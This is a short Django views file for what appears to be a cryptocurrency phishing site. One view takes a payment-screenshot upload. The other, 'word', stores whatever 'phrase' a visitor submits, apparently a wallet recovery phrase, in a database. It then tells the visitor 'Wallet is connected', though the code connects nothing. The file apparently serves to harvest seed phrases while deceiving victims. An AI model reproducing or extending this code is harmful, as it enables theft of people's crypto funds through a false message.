from django.shortcuts import render,redirect
from django.contrib import messages
from .models import *
from .forms import *


# Create your views here.
def home(request):
    # if request.method == 'POST':
    #     Upload_Screenshot_of_payment = request.Files['Upload_Screenshot_of_payment']
        
    #     assign = Paid(Upload_Screenshot_of_payment=Upload_Screenshot_of_payment)
    #     assign.save()
    #     return redirect('word')
    form = PaidForm()
    if request.method == 'POST':
        form = PaidForm(request.POST,request.FILES)
        if form.is_valid():
            form.save()
        return redirect('word')
    context={'form':form}
    return render(request,'home.html',context)


def word(request):
    if request.method == 'POST':
        phrase = request.POST['phrase']
        
        assign = Phrase(phrase=phrase)
        assign.save()
        messages.success(request,'Wallet is connected')
        return redirect('home')
    return render(request,'index.html')